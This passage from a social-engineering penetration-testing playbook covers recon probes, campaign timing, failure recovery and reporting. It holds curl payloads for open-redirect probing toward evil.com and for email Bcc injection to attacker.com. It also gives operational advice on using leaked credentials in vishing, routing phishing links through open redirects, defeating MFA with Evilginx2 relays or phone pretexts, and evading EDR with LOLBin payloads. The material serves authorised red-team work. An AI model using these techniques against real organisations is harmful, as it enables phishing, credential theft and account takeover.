    "https://target.com/login?$param=https://evil.com")
  [ -n "$location" ] && echo "OPEN REDIRECT: $param → $location"
done

# Email injection — contact/support form
curl -s -X POST https://target.com/contact \
  -d "name=Test&email=probe@attacker.com%0ABcc:+probe@attacker.com&message=test"
# Check if your probe address receives a copy
```

#### How to use what you find

**Leaked credential in git history:**
Use it directly in a vishing call — "I can see you have an account linked to the legacy API service." The target doesn't know you found it in a commit from 2019. It sounds like you have internal access.

**Confirmed username + role:**
Now you know who to call and what angle fits their job. A manager gets the urgency/authority play. An IT admin gets the peer impersonation. A finance contact gets the "payment verification" pretext.

**Open redirect on target domain:**
Your phishing link becomes `https://target.com/login?next=https://your-clone.com` — it starts on the real domain, passes spam filters, and the target sees a legitimate URL before being redirected to your clone.

**Email injection on contact form:**
Send your phishing email from target.com's own mail server. It passes SPF/DKIM because it genuinely originates there.

---

### 13.6 Timing Reference

Campaigns are not instantaneous. Operators frequently underestimate the dwell time required.

| Stage | Typical duration | Why |
|-------|-----------------|-----|
| OSINT sweep | 2–4 hours | Tool runtime + manual verification |
| Infrastructure prep | 4–8 hours | Domain propagation (up to 48h), cert issuance, portal clone tuning |
| Email delivery | 1–6 hours | Sending throttled to avoid spam filters: 50–200/hr max |
| Credential harvest window | 24–72 hours | Targets open email at different times; resend at 48h improves yield |
| Vishing calls | 2–4 hours | 15–20 min/call including prep; 8–12 calls per half-day |
| Physical drop → execution | 1–4 hours | Depends on target's work habits and curiosity latency |
| Consolidation + reporting | 4–8 hours | Validate all creds, document access chains, write findings |

**Total realistic timeline:** 5–10 business days for a full-scope campaign. Any client expecting results in 1–2 days is getting a subset — be explicit about this in scope documents.

---

### 13.7 Chain Failure Points

Knowing where campaigns fail is as important as knowing the steps.

| Failure point | Common cause | Recovery |
|--------------|--------------|---------|
| Low email open rate (<5%) | Wrong send time, spam filter, poor subject | Resend at 9am Tue/Wed; test subject line against spam scorer |
| No credentials submitted | Landing page too different from real portal | Re-clone, check field names and POST endpoint |
| Vishing hang-up | No rapport before ask | Rebuild pretext; use referral ("Sarah from HR said to call you") |
| USB not executed | Mac/Linux target, autorun disabled | Switch to .lnk payload; add curiosity lure filenames |
| Credentials rejected | Password changed post-harvest | Harvest within 4h window; vishing follow-up for new creds |
| MFA blocks access | TOTP codes expire in 30s | Evilginx2 real-time relay; or vishing for code verbally |
| Beacon blocked | EDR on endpoint | Change payload format; USB Rubber Ducky → certutil LOLBin |

---

---

## 14. Reporting Social Engineering Findings

SE findings should be documented using the same structured format as technical findings (see Pentest Playbook Phase 7). When using your pentest automation framework's report pipeline, SE-adjacent findings (phishing, credential reuse, pretexting success) can be mapped to compliance frameworks via the finding enrichment pipeline:

- **NIST 800-53:** AT-2 (Security Awareness Training), AT-3 (Role-Based Security Training)
- **ISO 27001:** Annex A 6.3 (Information Security Awareness)
- **PCI DSS:** Requirement 12.6 (Security Awareness Program)
- **Essential Eight:** not directly mapped (SE is outside the Eight's scope)

SE findings that demonstrate credential harvesting, unauthorized access, or data exposure may also trigger breach notification obligations — cross-reference Appendix K sections K.21/K.32/K.33 for jurisdiction-specific thresholds and timelines.

---

*Security Research Team — 2026-03-09*
*v1: Tool commands added throughout (GoPhish, SET, Evilginx2, theHarvester, Recon-ng, Hunter.io, Maltego, Shodan, Twilio, USB Rubber Ducky, O.MG Cable, Flipper Zero, Proxmark3, hardware keyloggers). Sections 1-12 complete.*
*v2: Section 13 (Campaign Chains) added — full sequencing for Phishing, Vishing, USB Drop, Full-Scope, and Tool-Assisted SE campaigns. Tool commands and handoff data maps throughout.*
